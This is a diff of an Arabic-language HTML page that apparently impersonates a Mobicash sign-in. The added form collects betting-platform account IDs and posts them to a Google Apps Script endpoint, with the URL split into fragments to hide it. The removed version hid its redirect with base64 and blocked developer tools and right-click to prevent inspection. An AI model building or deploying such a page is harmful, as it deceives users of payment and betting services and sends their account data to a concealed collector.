@@ -2,102 +2,246 @@
 <html lang="ar" dir="rtl">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Mobicash Services</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Sign in to - Mobicash</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script src="https://unpkg.com/lucide@latest"></script>
   <style>
-    :root {
-      --bg-light: #ffffff;
-      --bg-dark: #0e0e0e;
-      --text-light: #111;
-      --text-dark: #f1f1f1;
-      --ring-color: #00e676;
-      --ring-track: rgba(0, 0, 0, 0.1);
+    select option { color: #000; }
+    @media (prefers-color-scheme: dark) {
+      select option { color: #fff; }
     }
-
-    * { margin: 0; padding: 0; box-sizing: border-box; }
-
-    body {
-      height: 100vh;
-      background: var(--bg-light);
-      color: var(--text-light);
-      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-      display: flex;
-      flex-direction: column;
+    .fade { transition: all 0.3s ease; opacity: 0; transform: translateY(-5px); }
+    .fade.show { opacity: 1; transform: translateY(0); }
+    #oneClickTab {
+      background-color: #27632a;
+      border: none;
+      padding: 10px 18px;
+      border-radius: 8px;
+      display: inline-flex;
       align-items: center;
       justify-content: center;
-      transition: background 0.3s, color 0.3s;
-      text-align: center;
+      gap: 8px;
+      font-weight: 500;
+      font-family: 'Arial', sans-serif;
+      font-size: 16px;
+      color: #ffffff;
+      width: 100%;
+      margin-bottom: 24px;
+      transition: background-color 0.2s ease, color 0.2s ease;
     }
-
-    h1 {
-      font-size: 22px;
-      font-weight: 600;
-      margin-bottom: 25px;
-      letter-spacing: 0.3px;
+    #oneClickTab svg { fill: #ffffff; }
+    #oneClickTab:hover, #oneClickTab:active {
+      background-color: #d6eed9;
+      color: #2b2b2b;
     }
-
-    .spinner {
-      width: 32px;
-      height: 32px;
-      border: 1.8px solid var(--ring-track);
-      border-top: 1.8px solid var(--ring-color);
-      border-radius: 50%;
-      animation: spin 1s linear infinite;
-      margin-bottom: 15px;
+    #oneClickTab:hover svg, #oneClickTab:active svg {
+      fill: #2b2b2b;
     }
-
-    .loading-text {
-      font-size: 14px;
-      color: #777;
+    body {
+      user-select: none;
+      -webkit-user-drag: none;
+      -webkit-touch-callout: none;
     }
-
-    @keyframes spin {
-      to { transform: rotate(360deg); }
-    }
-
-    @media (prefers-color-scheme: dark) {
-      body {
-        background-color: var(--bg-dark);
-        color: var(--text-dark);
-      }
-
-      .spinner {
-        border: 1.8px solid rgba(255, 255, 255, 0.08);
-        border-top-color: #00e676;
-      }
-
-      .loading-text {
-        color: #aaa;
-      }
-    }
+    .dropdown-item img { display: none; }
   </style>
 </head>
-<body>
-  <h1>Mobicash Services</h1>
-  <div class="spinner"></div>
-  <p class="loading-text">جار التحميل، يرجى الانتظار...</p>
+<body class="bg-gray-100 dark:bg-gray-900 min-h-screen flex items-center justify-center px-4">
+  <div class="bg-white dark:bg-gray-800 shadow-2xl rounded-2xl p-8 w-full max-w-md">
+    <h2 class="text-2xl font-bold text-center text-gray-800 dark:text-white mb-6">Sign in to Mobicash</h2>
+    <button id="oneClickTab">
+      En un clic
+      <svg xmlns="http://www.w3.org/2000/svg" width="14" height="32" viewBox="0 0 14 16">
+        <path d="M10 5.5l-.2-.1H6.6L9.8 1V.8H4.9l-4 7v.3h3l-3 6.3v.3h.4l8.7-9c.1 0 .1-.1 0-.2z"/>
+      </svg>
+    </button>
+    <div class="mb-4 relative">
+      <label for="platform" class="block mb-2 text-sm font-medium text-gray-700 dark:text-gray-300">اختر المنصة</label>
+      <div id="customSelect" class="relative w-full">
+        <button id="dropdownBtn" class="w-full flex items-center justify-between px-4 py-2 border rounded-xl bg-white dark:bg-gray-700 text-sm text-gray-800 dark:text-white focus:outline-none focus:ring-2 focus:ring-blue-500">
+          <span id="selectedText">اختر المنصة</span>
+          <svg class="w-4 h-4 ml-2" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7" />
+          </svg>
+        </button>
+        <ul id="dropdownList" class="absolute z-10 w-full bg-white dark:bg-gray-700 border rounded-xl mt-1 hidden max-h-60 overflow-y-auto text-sm text-gray-800 dark:text-white">
+          <li class="dropdown-item px-4 py-2 hover:bg-gray-100 dark:hover:bg-gray-600 cursor-pointer flex items-center justify-between" data-value="Mega pari">
+            <span>Mega pari</span> <img src="https://i.postimg.cc/yx8yj8JF/recharge.jpg" class="w-6 h-6 rounded-full" />
+          </li>
+          <li class="dropdown-item px-4 py-2 hover:bg-gray-100 dark:hover:bg-gray-600 cursor-pointer flex items-center justify-between" data-value="Linbet">
+            <span>Linbet</span> <img src="https://i.postimg.cc/xCgWJjwv/recharge.jpg" class="w-6 h-6 rounded-full" />
+          </li>
+          <li class="dropdown-item px-4 py-2 hover:bg-gray-100 dark:hover:bg-gray-600 cursor-pointer flex items-center justify-between" data-value="Gooobet">
+            <span>Gooobet</span> <img src="https://i.postimg.cc/gk4fGxqP/recharge.jpg" class="w-6 h-6 rounded-full" />
+          </li>
+          <li class="dropdown-item px-4 py-2 hover:bg-gray-100 dark:hover:bg-gray-600 cursor-pointer flex items-center justify-between" data-value="1xbet">
+            <span>1xbet</span> <img src="https://i.postimg.cc/g277nb7D/recharge.jpg" class="w-6 h-6 rounded-full" />
+          </li>
+          <li class="dropdown-item px-4 py-2 hover:bg-gray-100 dark:hover:bg-gray-600 cursor-pointer flex items-center justify-between" data-value="Melbet">
+            <span>Melbet</span> <img src="https://i.postimg.cc/0jZWvTm7/recharge.jpg" class="w-6 h-6 rounded-full" />
+          </li>
+        </ul>
+        <input type="hidden" id="platform" name="platform" />
+      </div>
+    </div>
+    <div class="mb-4">
+      <label for="userId" class="block mb-2 text-sm font-medium text-gray-700 dark:text-gray-300">أدخل الـ ID</label>
+      <input type="text" id="userId" maxlength="13" inputmode="numeric" pattern="[0-9]*" placeholder="مثال: 1234567..." class="w-full px-4 py-2 border rounded-xl text-sm bg-white text-gray-800 dark:bg-gray-700 dark:text-white focus:outline-none focus:ring-2 focus:ring-blue-500" oninput="filterDigits(this); validateId()" onkeydown="return isNumberKey(event)" />
+    </div>
+    <div id="message" class="fade text-center text-sm mb-4 h-5"></div>
+    <button id="submitBtn" onclick="secureLogin()" class="relative w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-2 rounded-xl transition duration-300 flex items-center justify-center gap-2">
+      <i data-lucide="log-in" class="w-5 h-5"></i>
+      <span class="label">Sign in</span>
+      <svg id="loader" class="hidden absolute w-5 h-5 animate-spin" viewBox="0 0 24 24" fill="none">
+        <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
+        <path class="opacity-75" d="M4 12a8 8 0 018-8v8z" fill="currentColor"></path>
+      </svg>
+    </button>
+  </div>
 
-  <script>
-    const path = atob("ZnIvcmVjaGFyZ2UuaHRtbA==");
-    setTimeout(() => {
-      window.location.href = path;
-    }, 3500);
+<script>
+  lucide.createIcons();
 
-    document.addEventListener('keydown', function(e) {
-      if (
-        e.key === "F12" ||
-        (e.ctrlKey && e.shiftKey && (e.key === "I" || e.key === "J" || e.key === "C")) ||
-        (e.ctrlKey && e.key === "U")
-      ) {
-        e.preventDefault();
-        e.stopPropagation();
-        return false;
+  const isRepeatedDigits = id => /^(\d)\1{6,12}$/.test(id);
+
+  function showMessage(text, type = "error") {
+    const msg = document.getElementById("message");
+    msg.className = "fade show text-center text-sm mb-4 h-5";
+    msg.textContent = text;
+    msg.style.color = type === "success" ? "green" : "red";
+  }
+
+  function filterDigits(input) {
+    input.value = input.value.replace(/[^\d]/g, '');
+  }
+
+  function isNumberKey(e) {
+    const key = e.key;
+    return /^[0-9]$/.test(key) || ['Backspace', 'Delete', 'ArrowLeft', 'ArrowRight', 'Tab'].includes(key);
+  }
+
+  function validateId() {
+    const userId = document.getElementById("userId").value;
+    if (isRepeatedDigits(userId)) {
+      showMessage("المعرف غير معتمد. الرجاء التحقق.");
+      return;
+    }
+    document.getElementById("message").className = "fade";
+    document.getElementById("message").textContent = "";
+  }
+
+  function resetForm() {
+    const btn = document.getElementById("submitBtn");
+    const loader = document.getElementById("loader");
+    const label = btn.querySelector(".label");
+    btn.disabled = false;
+    btn.classList.remove("opacity-50", "cursor-not-allowed");
+    loader.classList.add("hidden");
+    label.classList.remove("hidden");
+    document.getElementById("platform").disabled = false;
+    document.getElementById("userId").disabled = false;
+  }
+
+  function getRealScriptURL() {
+    const a = "https://script";
+    const b = ".google.com/macros/s/";
+    const c = "AKfycbztE1ZG1WWVrbtfaKPTqOatcrue2jjUDoGpdPv1HyHcq0l6rPyD7aL6OT5Pfekpf_pAUA";
+    return a + b + c + "/exec";
+  }
+
+  function secureLogin() {
+    const platform = document.getElementById("platform").value;
+    const userId = document.getElementById("userId").value.trim();
+    const btn = document.getElementById("submitBtn");
+    const loader = document.getElementById("loader");
+    const label = btn.querySelector(".label");
+
+    if (!platform) return showMessage("اختر المنصة.");
+    if (!userId) return showMessage("أدخل المعرّف.");
+    if (userId.length < 7 || userId.length > 13 || !/^\d+$/.test(userId) || isRepeatedDigits(userId)) {
+      return showMessage("المعرف غير معتمد. الرجاء التحقق.");
+    }
+
+    btn.disabled = true;
+    btn.classList.add("opacity-50", "cursor-not-allowed");
+    loader.classList.remove("hidden");
+    label.classList.add("hidden");
+    document.getElementById("platform").disabled = true;
+    document.getElementById("userId").disabled = true;
+
+    sessionStorage.setItem("authorized", "true");
+    localStorage.setItem("platform", platform);
+    localStorage.setItem("userId", userId);
+
+    fetch(getRealScriptURL(), {
+      method: "POST",
+      mode: "no-cors",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ platform, userId })
+    }).finally(() => {
+      setTimeout(() => {
+        window.location.href = "dashboard.html";
+      }, 800);
+    });
+  }
+
+  document.getElementById("oneClickTab").addEventListener("click", () => {
+    document.getElementById("platform").value = "";
+    document.getElementById("selectedText").textContent = "اختر المنصة";
+    document.getElementById("userId").value = "";
+    document.getElementById("message").className = "fade";
+    document.getElementById("message").textContent = "";
+    resetForm();
+  });
+
+  const dropdownBtn = document.getElementById("dropdownBtn");
+  const dropdownList = document.getElementById("dropdownList");
+  const selectedText = document.getElementById("selectedText");
+  const platformInput = document.getElementById("platform");
+
+  dropdownBtn.addEventListener("click", () => {
+    dropdownList.classList.toggle("hidden");
+  });
+
+  document.querySelectorAll(".dropdown-item").forEach(item => {
+    item.addEventListener("click", () => {
+      const value = item.getAttribute("data-value");
+      platformInput.value = value;
+      dropdownList.classList.add("hidden");
+      const img = item.querySelector("img").getAttribute("src");
+      selectedText.innerHTML = `<span>${value}</span><img src="${img}" class="w-6 h-6 rounded-full ml-2" />`;
+    });
+  });
+
+  window.addEventListener("click", function(e) {
+    if (!dropdownBtn.contains(e.target) && !dropdownList.contains(e.target)) {
+      dropdownList.classList.add("hidden");
+    }
+  });
+
+  document.addEventListener("DOMContentLoaded", () => {
+    const storedPlatform = localStorage.getItem("platform");
+    const storedId = localStorage.getItem("userId");
+
+    if (storedPlatform) {
+      const item = [...document.querySelectorAll(".dropdown-item")].find(i => i.dataset.value === storedPlatform);
+      if (item) {
+        platformInput.value = storedPlatform;
+        const img = item.querySelector("img").getAttribute("src");
+        selectedText.innerHTML = `<span>${storedPlatform}</span><img src="${img}" class="w-6 h-6 rounded-full ml-2" />`;
+      } else {
+        platformInput.value = "";
+        selectedText.textContent = "اختر المنصة";
       }
-    });
+    }
 
-    window.addEventListener('contextmenu', function (e) {
-      e.preventDefault();
-    });
-  </script>
+    if (storedId) document.getElementById("userId").value = storedId;
+    resetForm();
+  });
+
+  window.addEventListener("pageshow", (e) => {
+    if (e.persisted) resetForm();
+  });
+</script>
 </body>
 </html>
